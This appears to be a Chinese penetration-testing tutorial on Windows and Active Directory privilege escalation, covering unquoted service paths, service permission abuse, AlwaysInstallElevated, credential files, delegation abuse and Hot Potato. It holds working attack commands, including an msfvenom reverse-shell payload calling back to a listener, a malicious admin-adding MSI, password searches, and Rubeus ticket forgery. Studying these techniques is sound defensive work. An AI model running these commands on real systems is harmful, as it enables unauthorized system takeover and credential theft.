\u4ee4\u724c\u7a83\u53d6 \u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84 \uff08 Trusted Service Paths \uff09 \u5148\u8bf4\u5b9e\u7528\u5ea6\uff0c\u6bd4\u8f83\u88ab\u52a8\uff0c\u800c\u4e14\u6bd4\u8f83\u770b\u8138\u3002 Windows\u4e0b\u670d\u52a1\u7684\u6743\u9650\u901a\u5e38\u662fSYSTEM\u3002\u5982\u679c\u6211\u4eec\u80fd\u591f\u66ff\u6362\u670d\u52a1\u7684\u542f\u52a8\u7a0b\u5e8f\u4e3a\u6211\u4eec\u7684\u6076\u610f\u7a0b\u5e8f\uff08\u5982\u53cd\u5f39shell\uff09\uff0c\u5373\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86SYSTEM\u6743\u9650\uff0c\u8fbe\u5230\u4e86\u63d0\u6743\u7684\u76ee\u7684\u3002 \u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4\u8fd9\u79cd\u60c5\u51b5\u7684\u53d1\u751f\u3002 \u6240\u8c13\u65e0\u5f15\u53f7\u670d\u52a1\u8def\u5f84\uff0c\u5c31\u662f\u670d\u52a1\u542f\u52a8\u7a0b\u5e8f\u7684\u8def\u5f84\u4e2d\u5305\u542b\u4e86\u7a7a\u683c\u4e14\u672a\u88ab\u5f15\u53f7\u5305\u542b\u8d77\u6765\u3002\u6bd4\u5982\u8fd9\u6837 C:\\Program Files\\floder1\\service.exe \u56e0\u4e3a\u7a7a\u683c\u7684\u5b58\u5728\uff0cWindows\u5728\u542f\u52a8\u670d\u52a1\u627e\u5bfb\u670d\u52a1\u542f\u52a8\u9879\u65f6\uff0c\u5b83\u4f1a\u6309\u7167\u4ee5\u4e0b\u987a\u5e8f\u8fdb\u884c\u542f\u52a8\u9879\u5bfb\u627e C:\\Program.exe C:\\Program Files\\Some.exe C:\\Program Files\\Some Folder\\Service.exe \u8fd9\u5c31\u7ed9\u4e86\u6211\u4eec\u6709\u673a\u53ef\u4e58\u7684\u673a\u4f1a\uff1a\u5982\u679c\u6211\u4eec\u5728\u670d\u52a1\u7684\u4e0a\u5c42\u76ee\u5f55\u6709\u5199\u5165\u6216\u5b8c\u5168\u63a7\u5236\u6743\u9650\uff0c\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u5c06\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5728Windows\u641c\u5bfb\u670d\u52a1\u542f\u52a8\u9879\u7684\u66f4\u9760\u524d\u987a\u5e8f\u4e0a\u3002 \u6211\u4eec\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u641c\u7d22\u54ea\u4e9b\u670d\u52a1\u8def\u5f84\u6ca1\u6709\u5305\u542b\u5f15\u53f7 wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" \u627e\u5230\u4e00\u4e2a\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u7684\u601d\u8def\u53ef\u80fd\u5c31\u662f\u57282345Explorer\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2aProtect.exe\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u770b\u770b2345Explorer\u76ee\u5f55\u6211\u4eec\u7684\u6743\u9650\u5982\u4f55\u3002 \u5148\u6765\u4e00\u624bwhoami /all.\u53d1\u73b0\u81ea\u5df1\u662fUsers\u7ec4\u7684\u3002 \u7136\u540e\u4f7f\u7528icacls\u547d\u4ee4\u67e5\u770b\u57282345Explorer\u76ee\u5f55\u7684\u6743\u9650\u5982\u4f55 users\u7ec4\u662f\u5b8c\u5168\u63a7\u5236\u6743\uff08F\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u76f4\u63a5\u7528msfvenom\u6784\u9020\u4e00\u4e2a\u53cd\u5f39shell\u7684exe\u3002\u547d\u540d\u4e3aProtect.exe\uff0c\u653e\u51652345Explorer\u76ee\u5f55\u3002\u6211\u8fd9\u91cc\u968f\u4fbf\u7f16\u7801\u4e86\u4e00\u4e0b msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai LHOST=192.168.111.129 LPORT=10068 -f exe -o Protect.exe \u7136\u540e\u6211\u4eec\u73b0\u5728\u662f\u6ca1\u6709\u80fd\u529b\u91cd\u542f\u670d\u52a1\u7684\u3002\u3002\u53ea\u80fd\u7b49\u7ba1\u7406\u5458\u91cd\u542f\u670d\u52a1\u6216\u8005\u673a\u5b50\u91cd\u542f\u3002\u7136\u540e\u5c31\u62ff\u5230SYSTEM\u6743\u9650\u4e86\u3002\u4f46\u662f\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u5751\u70b9\uff0c\u8fd9\u4e2a\u5751\u70b9\u662f\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u542f\u52a8\u540e\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\u672a\u4e0e Service Control Manager(SCM) \u901a\u8baf\uff0c\u5c31\u4f1a\u88ab\u505c\u6b62\u3002 \u6240\u4ee5\u6211\u4eec\u8981\u5728\u62ff\u5230shell\u540e\u53ca\u65f6\u7684\u8f6c\u79fb\u8fdb\u7a0b\u6216\u8005\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u6237\u3002 \u8f6c\u79fb\u8fdb\u7a0b\u5728msf\u4e2d\u5f88\u7b80\u5355\uff0cmeterpreter\u4e2d\u5148\u7528ps\u67e5\u770b\u8fdb\u7a0b\uff0c\u968f\u4fbf\u627e\u4e00\u4e2asystem\u6743\u9650\uff0c\u8bb0\u4f4f\u5176pid\uff0c\u7136\u540e migrate PID \u5373\u53ef\u5b8c\u6210\u8fdb\u7a0b\u8fc1\u79fb\u3002 \u4e0b\u9762\u6765\u8bf4\u8bf4\u9632\u6cbb\u65b9\u6cd5\u5427\u3002\u8fdb\u5165\u6ce8\u518c\u8868\u4fee\u6539\u7a97\u53e3\uff0c\u5728 HKEY_LOCAL_MACHINE >> SYSTEM >> CurrentControlSet >> Services \u8def\u5f84\u4e0b\u627e\u5230\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\uff0c\u4fee\u6539\u5176ImagePath\uff0c\u628a\u8def\u5f84\u524d\u540e\u52a0\u4e2a\u5f15\u53f7\u5c31\u53ef\u4e86\u3002 \u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\uff08 Vulnerable Services \uff09 \u540c\u6837\u770b\u8138\u4e14\u88ab\u52a8 \u8fd9\u4e2a\u653b\u51fb\u65b9\u6cd5\u5927\u81f4\u5206\u4e24\u7c7b 1.\u66ff\u6362\u670d\u52a1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u8fd9\u4e2a\u65b9\u6cd5\u8f83\u4e3a\u7b80\u5355\uff0c\u5982\u679c\u5bf9\u670d\u52a1\u4e8c\u8fdb\u5236\u6587\u4ef6\u6240\u5728\u76ee\u5f55\u6709\u4fee\u6539\u6743\uff0c\u90a3\u4e48\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6076\u610f\u7a0b\u5e8f\u6765\u66ff\u6362\u539f\u6709\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u670d\u52a1\u3002\u8fd9\u4e2a\u6bd4\u8f83\u7b80\u5355\uff0c\u800c\u4e14\u57fa\u672c\u4e0a\u653b\u51fb\u6d41\u7a0b\u548c Trusted Service Paths \u5982\u51fa\u4e00\u8f99\uff0c\u540c\u6837\u4e5f\u662f\u6bd4\u8f83\u88ab\u52a8\u5730\u7b49\u5f85\u91cd\u542f\u670d\u52a1\u624d\u80fd\u5f39shell\uff0c\u5c31\u4e0d\u518d\u6f14\u793a\u4e86\u3002 2.\u4fee\u6539\u670d\u52a1\u7684\u5c5e\u6027\u3002\u5982\u679c\u6211\u4eec\u80fd\u4fee\u6539\u670d\u52a1\u7684 BINARY_PATH_NAME \u5c5e\u6027\uff08\u8fd9\u4e2a\u5c5e\u6027\u7528\u4e8e\u6307\u5411\u670d\u52a1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e BINARY_PATH_NAME \u7684\u503c\u4e3a\u7cfb\u7edf\u547d\u4ee4\uff0c\u7136\u540e\u91cd\u542f\u670d\u52a1\u65f6\u6211\u4eec\u7684\u7cfb\u7edf\u547d\u4ee4\u4f1a\u88ab\u6267\u884c\u3002 \u5bf9\u4e8e\u540e\u8005\uff0c\u6211\u4eec\u9700\u8981\u4e00\u6b3e\u5de5\u5177\u6765\u5feb\u901f\u63ed\u793a\u51fa\u6211\u4eec\u80fd\u4fee\u6539\u54ea\u4e9b\u670d\u52a1\u7684\u5c5e\u6027\u3002 \u8fd9\u4e2a\u5de5\u5177\u6211\u4eec\u91c7\u7528accesschk.exe\uff0c\u5b83\u662f\u5fae\u8f6f\u4ea7\u51fa\u7684\uff0c\u57fa\u672c\u4e0d\u4f1a\u62a5\u6bd2\u3002 \u6211\u4eec\u901a\u8fc7\u8be5\u5de5\u5177\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula or accesschk.exe -uwcqv \"Users\" * /accepteula \u6765\u67e5\u770bUsers\u7ec4\uff08\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u6765\u586b\u54ea\u4e2a\u7ec4\uff09\u5bf9\u54ea\u4e9b\u670d\u52a1\u6709\u54ea\u4e9b\u6743\u9650 \u5982\u679c\u5bf9\u67d0\u4e2a\u670d\u52a1\u6709service_all_access\u6216\u8005\u4ee5\u4e0b\u6743\u9650\uff0c\u5c31\u8bf4\u660e\u80fd\u5bf9\u5176\u5c5e\u6027\u8fdb\u884c\u4fee\u6539\u3002 \u6bd4\u5982\u6211\u4eec\u5bf9Spooler\u670d\u52a1\u6709service_all_access\u6743\u9650\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fd9\u6837\u505a\u3002 \u901a\u8fc7\u4fee\u6539\u5176binPath\u4e3a\u6076\u610f\u6307\u4ee4\uff0c\u7136\u540e\u7b49\u5f85\u7ba1\u7406\u5458\u91cd\u542f\u670d\u52a1\uff0c\u6211\u4eec\u7684\u6076\u610f\u6307\u4ee4\u5c31\u4f1a\u88ab\u6267\u884c\u3002 AlwaysInstallElevated \u5982\u679cwindows\u542f\u7528\u4e86\u5982\u4e0b\u6ce8\u518c\u8868\u9879 [HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] \u201cAlwaysInstallElevated\u201d=dword:00000001 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer] \u201cAlwaysInstallElevated\u201d=dword:00000001 \u90a3\u4e48\u6240\u6709msi\uff08windows\u5e94\u7528\u5b89\u88c5\u7a0b\u5e8f\uff09\u90fd\u4f1a\u4ee5SYSTEM\u6743\u9650\u8fd0\u884c\u3002\u6b64\u65f6\u5982\u679c\u6211\u4eec\u6267\u884c\u4e00\u4e2a\u6076\u610fmsi\u7a0b\u5e8f\uff0c\u5373\u53ef\u8fbe\u5230\u63d0\u6743\u76ee\u7684 \u540c\u65f6\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u8fd9\u4e2a\u6ce8\u518c\u8868\u9879\u4e0d\u4e00\u5b9a\u603b\u662f\u5b58\u5728\u7684\u3002\uff08\u6bd4\u5982\u6211\u7684\u5b9e\u9a8c\u673a \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7reg query\u6765\u9a8c\u8bc1\u8fd9\u4e24\u6761\u6ce8\u518c\u8868\u9879\u7684\u60c5\u51b5 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated \u82e5\u5747\u4e3a1\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7msfvenom\u751f\u6210\u6076\u610fmsi\u6765\u63d0\u6743 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi \u7136\u540e\u6267\u884c\uff0c\u83b7\u5f97\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u3002 \u4fe1\u606f\u6cc4\u9732 Unattend.xml sysprep.xml\u548csysprep.inf\u6587\u4ef6 GPP.xml \u5b58\u5728\u7740\u4e00\u5b9a\u4fe1\u606f\u6cc4\u9732\uff0c\u4ed6\u4eec\u901a\u5e38\u5b58\u5728\u4e8e\u4ee5\u4e0b\u8def\u5f84 C:\\Windows\\Panther\\ C:\\Windows\\Panther\\Unattend\\ C:\\Windows\\System32\\ C:\\Windows\\System32\\sysprep\\ \u627e\u5230\u540e\uff0c\u627e\u5230 Unattend.xml \u6587\u4ef6\u4e2d\u7684 \u6807\u7b7e\u3002\u5c31\u6709\u53ef\u80fd\u627e\u5230\u7528\u6237\u7684\u52a0\u5bc6\u540e\u7684\u5bc6\u7801\u3002\u3002 <UserAccounts> <LocalAccounts> <LocalAccount> <Password> <Value>UEBzc3dvcmQxMjMhUGFzc3dvcmQ=</Value> //PASSWORD <PlainText>false</PlainText> </Password> <Description>Local Administrator</Description> <DisplayName>Administrator</DisplayName> <Group>Administrators</Group> <Name>Administrator</Name> </LocalAccount> </LocalAccounts> </UserAccounts> \u4e00\u4e9b\u654f\u611f\u6587\u4ef6\u67e5\u8be2\u6307\u4ee4 C:\\Users\\user\\Desktop> dir C:\\ /s /b /c | findstr /sr \\*password\\* reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s \u57fa\u4e8e\u8d44\u6e90\u7684\u57df\u59d4\u6d3e\u653b\u51fb refer: https://xz.aliyun.com/t/7454 \u539f\u7406\u7684\u51e0\u4e2a\u70b9\uff1a 1.S4U2SELF \u534f\u8bae\u53ef\u4ee5\u5728\u7528\u6237\u6ca1\u6709\u914d\u7f6e TrustedToAuthenticationForDelegation \u5c5e\u6027\uff08\u5373\u5f00\u542f\u4f7f\u7528\u4efb\u4f55\u534f\u8bae\u8ba4\u8bc1\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\uff09\u65f6\u88ab\u8c03\u7528\uff0c\u4f46\u662f\u8fd4\u56de\u7684ST\u662f\u4e0d\u53ef\u88ab\u8f6c\u53d1\u7684\u3002 2.\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u4e3b\u673a \u5728\u88ab\u53e6\u4e00\u53f0\u4e3b\u673a\u59d4\u6d3e\u8bbf\u95ee\u65f6\uff0c\u5728S4U2PROXY\u8fc7\u7a0b\u4e2d\u63d0\u4ea4\u8fc7\u6765\u7684ST\u5982\u679c\u5373\u4f7f\u662f\u4e0d\u53ef\u8f6c\u53d1\u7684\u3002KDC\u4f9d\u65e7\u4f1a\u8fd4\u56de\u6709\u6548\u7684ST2\u3002 3.\u6bcf\u4e2a\u666e\u901a\u57df\u7528\u6237\u9ed8\u8ba4\u53ef\u4ee5\u521b\u5efa\u81f3\u591a\u5341\u4e2a\u673a\u5668\u8d26\u6237\uff08 \u7531MachineAccountQuota\u5c5e\u6027\u51b3\u5b9a \uff09\uff0c\u6bcf\u4e2a\u673a\u5668\u8d26\u6237\u88ab\u521b\u5efa\u65f6\u90fd\u4f1a\u81ea\u52a8\u6ce8\u518cSPN: RestrictedKrbHost/domain \u548c HOST/domain \u8fd9\u4e24\u4e2aSPN \u653b\u51fb\u6d41\u7a0b: \u5047\u8bbe\u5f00\u542f\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u673a\u5668\u4e3aA 1.\u9996\u5148\u8981\u6709\u4e00\u4e2a\u5bf9\u5f53\u524d\u8ba1\u7b97\u673a\u6709\u5199\u6743\u9650\u7684\u8d26\u6237\uff0c\u624d\u80fd\u5bf9A\u8bbe\u7f6e\u53ef\u4ee5 \u88ab \u59d4\u6d3e\u8bbf\u95ee\u7684\u670d\u52a1\u8d26\u6237\u3002 2.\u5229\u7528\u5f53\u524d\u8d26\u6237\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u6237\uff0c\u5e76\u914d\u7f6e\u597d\u673a\u5668\u8d26\u6237\u5230A\u7684 \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e 3.\u56e0\u4e3a\u673a\u5668\u8d26\u6237\u662f\u6211\u4eec\u521b\u5efa\u7684\uff0c\u6211\u4eec\u77e5\u9053\u4ed6\u7684\u5bc6\u7801\u8d26\u6237\uff0c\u53ef\u4ee5\u8ba9\u5b83\u5229\u7528S4U2SELF\u534f\u8bae\u83b7\u5f97\u4e00\u4e2a\u4e0d\u53ef\u8f6c\u53d1ST\u3002\u7136\u540e\u7528\u8fd9\u4e2a\u4e0d\u53ef\u8f6c\u53d1ST\u901a\u8fc7S4U2PROXY\uff0c\u5728\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u57fa\u7840\u4e0a\u83b7\u5f97\u6709\u6548\u7684\u8bbf\u95eeA cifs\u670d\u52a1\u7684ST2\u3002 4.\u7528ST2\u8bbf\u95eeA\u7684CIFS\u670d\u52a1\uff0c\u6743\u9650\u83b7\u5f97\u3002 \u5b9e\u64cd \u8fd9\u4e2a\u653b\u51fb\u8bf4\u767d\u4e86\u5c31\u662f\u4e2a\u63d0\u6743... \u9996\u5148\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u57df\u63a7\u662f\u5426\u662fwin2012\u4ee5\u4e0a\u7684\u4e3b\u673a\uff0c\u56e0\u4e3a\u53ea\u6709\u8fd9\u6837\u624d\u80fd\u5f00\u542f \u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002 \u6211\u4eec\u4f7f\u7528powersploit\u4e0b\u7684powerview\u811a\u672c\u3002\u6267\u884c\u547d\u4ee4 get-netdomaincontroller \u53ef\u4ee5\u83b7\u5f97\u57df\u63a7WIN\u7248\u672c \u7136\u540e\u6211\u4eec\u67e5\u770b\u5f53\u524d\u7528\u6237\u5bf9\u54ea\u53f0\u4e3b\u673a\u6709\u5199\u6743\u9650\u3002\u56e0\u4e3a\u662f\u5b9e\u9a8c\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u6765\u770b\u770b\u600e\u4e48\u914d\u7f6e\u4e00\u4e2a\u7528\u6237\u5bf9\u4e00\u4e2a\u673a\u5668\u7684\u6743\u9650\u3002 \u76f4\u63a5\u5728\u57df\u63a7\u4e0a\u627e\u5230\u67d0\u4e3b\u673a\uff0c\u7136\u540e\u8fdb\u5165\u5728\u5c5e\u6027\u91cc\u8fdb\u5165\u5b89\u5168\u9009\u9879\u5361\uff0c\u6dfb\u52a0\u67d0\u7528\u6237\uff0c\u7136\u540e\u7ed9\u8fd9\u4e2a\u7528\u6237\u5206\u914d\u6743\u9650\u5373\u53ef\u3002 \u6211\u4eec\u4f9d\u65e7\u4f7f\u7528powerview\u3002\u5148\u8c03\u7528 Get-DomainUser -Identity username -Properties objectsid \u6765\u83b7\u53d6\u5f53\u524d\u7528\u6237SID \u7136\u540e Get-DomainObjectAcl -Identity \u4e3b\u673a\u540d | ?{$_.SecurityIdentifier -match \"\u521a\u521a\u5f97\u5230\u7684SID\"} \u67e5\u770b\u5f53\u524d\u7528\u6237\u5bf9\u67d0\u53f0\u4e3b\u673a\u662f\u5426\u6709\u5199\u6743\u9650\u3002 \u5982\u679c\u6709 GenericAll\uff08\u5b8c\u5168\u63a7\u5236\u6743\uff09\uff0cGenericWrite\u3001WriteProperty\u3001WriteDacl \u8fd9\u4e9b\u5c5e\u6027\uff0c\u5c31\u8bf4\u660e\u8be5\u7528\u6237\u80fd\u4fee\u6539\u8ba1\u7b97\u673a\u7684\u8d26\u6237\u5c5e\u6027\u3002 \u5982\u56fe\u770b\u5230\u6211\u4eec\u5bf9WIN7\u8fdb\u884c\u64cd\u4f5c \u597d\u7684\uff0c\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u8981\u521b\u7acb\u4e00\u4e2a\u673a\u5668\u7528\u6237\u4e86\u3002\u6839\u636e\u7f51\u4e0a\u641c\u7d22\u7ed3\u679c\uff0c\u4f7f\u7528powermad\u8fd9\u4e2aps\u811a\u672c\u53ef\u4ee5\u5f88\u5feb\u6377\u7684\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u7528\u6237\u3002 https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString \"hack\" -AsPlainText -Force) \u597d\u7684\uff0c\u6211\u4eec\u6dfb\u52a0\u4e86\u4e00\u4e2a\u5bc6\u7801hack\uff0c\u540d\u4e3ahacksystem\u7684\u673a\u5668\u8d26\u6237\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u914d\u7f6ehacksystem\u5230WIN7\u7684\u59d4\u6d3e\u4e86\u3002\u6211\u4eec\u9700\u8981\u505a\u7684\uff0c\u662f\u4fee\u6539WIN7\u7684 msDS-AllowedToActOnBehalfOfOtherIdentity \u5c5e\u6027\u7684\u503c \uff0c\u8fd9\u4e2a\u64cd\u4f5c\u6211\u4eec\u7528powerview\u5b9e\u73b0\u3002 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)\" #\u8fd9\u513f\u7684sid\u662f\u6211\u4eec\u521b\u5efa\u7684#\u673a\u5668\u7528\u6237#evilsystem\u7684sid $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer WIN7| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose \u81f3\u4e8e\u673a\u5668\u8d26\u6237SID\u600e\u4e48\u83b7\u5f97\uff0cpowerview\u4e0b\u7684 get-domiancomputer hacksystem \u7136\u540e\u4f7f\u7528 Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity \u67e5\u770b\u59d4\u6d3e\u662f\u5426\u8bbe\u7f6e\u6210\u529f Set-DomainObject win7 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose \u6b64\u547d\u4ee4\u53ef\u4ee5\u6e05\u9664 msds-allowedtoactonbehalfofotheridentity\u5c5e\u6027\u7684\u503c \u73b0\u5728\u90fd\u7edf\u7edf\u8bbe\u7f6e\u597d\u4e86\uff0c\u5f00\u59cb\u4e0b\u4e00\u6b65\u5427\u3002 \u7f51\u4e0a\u4e00\u822c\u7528\u7684rubeus\uff0c\u8fd9\u91cc\u6211\u7528kekeo\u5427 Rubeus.exe hash /user:xxx /password:xxx /domain:xxx \u672c\u5730\u8fd0\u7b97\u51fa\u673a\u5668\u7528\u6237ntlm hash \u8fd9\u91cc\u501f\u7528\u4e00\u4e0b\u522b\u4eba\u7684\u56fe Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt \u5199\u5165\u7968\u636e \u7136\u540e\u6211\u5728\u672c\u673a\u4f7f\u7528\u4ee5\u4e0a\u65b9\u6cd5\u540eklist\u4e00\u4e0b\uff0c\u53d1\u73b0\u786e\u5b9e\u5b58\u5728\u7968\u636e \u4f46\u662fdir \\test1\\c\\$\u65f6\u672c\u673a\u83ab\u540d\u5176\u5999\u4e0d\u80fd\u8fdb\u884ckerberos\u9a8c\u8bc1\uff0c\u6211\u670d\u4e86\u300b\u3002\u3002\u4f46\u4e0d\u7ba1\u600e\u6837\uff0c\u6211\u4eec\u62ff\u5230\u94f6\u7968\u4e86 \u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u7684\u7ed5\u8fc7 \u82e5\u6211\u4eec\u7684administrator\u7528\u6237\u88ab\u8bbe\u7f6e\u4e3a\u654f\u611f\u7528\u6237\u4e0d\u53ef\u59d4\u6d3e\u6216\u8005\u88ab\u52a0\u5165\u4fdd\u62a4\u7ec4\uff0c\u6309\u7406\u8bf4\u4ed6\u7684\u8bbf\u95ee\u5c31\u4e0d\u80fd\u8fdb\u884c\u59d4\u6d3e\u3002 \u6211\u4eec\u5728\u4ee5administrator\u8d26\u6237\u8eab\u4efd\u8fdb\u884cS4U\u65f6\uff0c\u53ea\u80fd\u8fdb\u884cS4U2SELF\uff0c\u4e0d\u80fd\u8fdb\u884cS4U2PROXY\u3002\u6211\u4eec\u7528 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt \u7ee7\u7eed\u5b9e\u9a8cadministrator\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8fd9\u6837 \u6b64\u65f6\u6211\u4eec\u7528 rubeus.exe describe /ticker:S4Ubase64\u52a0\u5bc6\u7684\u7968\u636e \u53ef\u4ee5\u53d1\u73b0servicename\u5e76\u6ca1\u6709\u6307\u5b9a\u67d0\u4e2a\u670d\u52a1\uff0c\u4ec5\u4ec5\u53ea\u6709\u4e00\u4e2a\u8d26\u6237.\u5373\u53d1\u751f\u4e86\u670d\u52a1\u540d\u79f0\u7f3a\u5931\u7684\u95ee\u9898\u3002\u5f88\u7b80\u5355\uff0c\u628a\u7968\u636e\u4fee\u6539\u4e00\u4e0b\u5c31\u884c\u4e86.\u7f51\u4e0a\u5f88\u591a\u8bf4\u7528\u8fd9\u4e2a\u5de5\u5177 https://www.pkisolutions.com/tools/asn1editor/ \u4f46\u5b9e\u9645\u4e0arubeus\u4e5f\u80fd\u5b8c\u6210\u7968\u636e\u4fee\u6539 rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt \u5b8c\u4e8b POTATO \u5bb6\u65cf hot potato \u70ed\u571f\u8c46\u63d0\u6743\u3002\u5f88\u65e9\u524d\u5c31\u542c\u8bf4\u8fc7\u4e86\uff0c\u4f46\u4e00\u76f4\u6ca1\u53bb\u4e86\u89e3\u8fc7\u3002\u524d\u7f6e\u77e5\u8bc6\u662fntlm relay,\u53ef\u4ee5\u53bb\u4e86\u89e3\u4e86\u89e3\u3002 potato\u5bb6\u65cf\u6709\u5f88\u591a\uff0chot potato\u53ea\u662f\u5176\u4e2d\u4e00\u79cd\u63d0\u6743\u65b9\u5f0f\u3002 \u6211\u73af\u5883\u6709\u95ee\u9898\uff0c\u4e0d\u80fd\u5f88\u597d\u7684\u590d\u73b0\ud83d\ude43\uff0c\u6293\u5305\u5206\u6790\u5565\u7684\u5148\u5495\u5495\u5427\u3002 https://github.com/foxglovesec/Potato\ud83d\udc48\u5de5\u5177 https://foxglovesecurity.com/2016/01/16/hot-potato/ \ud83d\udc48HOT POTATO\u6280\u672f\u6587\u6863\uff0c\u56fd\u5185\u57fa\u672c\u4e0a\u7ffb\u8bd1\u8fd9\u4e2a\u6765\u7684\u3002 \u63d0\u6743\u6b65\u9aa4\u5927\u6982\u662f\u8fd9\u4e2a\u6d41\u7a0b 1.\u672c\u5730nbns\u670d\u52a1\u6b3a\u9a97 2.wpad\u52ab\u6301 3.HTTP->SMB \u7684 ntlm relay 1.\u672c\u5730nbns\u670d\u52a1\u6b3a\u9a97 Windows\u57df\u540d\u89e3\u6790\u89c4\u5219\u662f \u672c\u5730HOST\u6587\u4ef6-\u300bdns\u67e5\u8be2-\u300bNBNS\u6216\u8005LLMNR\u67e5\u8be2 \u4e00\u65e6\u672c\u5730\u53d1\u51faNBNS\u67e5\u8be2\uff0c\u6211\u4eec\u672c\u5730\u5c31\u53ef\u4ee5\u8fc5\u901f\u54cd\u5e94\uff0c\u556a\u7684\u4e00\u4e0b\u5c31\u54cd\u5e94\u4e86\uff0c\u5f88\u5feb\u554a\uff0c\u672c\u5730\u53d1\u5305\u5f88\u5feb\uff0c\u53ea\u8981\u53d1\u51faNBNS\u5305\u57fa\u672c\u4e0a\u90fd\u80fd\u88ab\u6211\u4eec\u672c\u5730\u53d1\u5305\u54cd\u5e94\u3002 \u4f46\u662f\u4ee5\u4e0a\u6b65\u9aa4\u8fd8\u662f\u6709\u4e00\u4e9b\u7ec6\u8282\u7684\uff1a\u6211\u4eec\u5f53\u524d\u5e76\u975e\u7ba1\u7406\u5458\u6743\u9650\uff0c\u5927\u51e0\u7387\u662f\u65e0\u6cd5\u55c5\u63a2\u672c\u5730\u6d41\u91cf\u7684,\u5982\u679c\u6211\u4eec\u80fd\u591f\u4e8b\u5148\u77e5\u9053\u76ee\u6807\u4e3b\u673a\u671f\u671bNBNS\u67e5\u8be2\u83b7\u5f97\u7684\u4e3b\u673a\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u54cd\u5e94\uff0c\u5bf9\u53d1\u9001NBNS\u67e5\u8be2\u7684\u90a3\u4e2a\u4e3b\u673a\u5feb\u901f\u7684\u5927\u91cf\u53d1\u9001NBNS\u54cd\u5e94 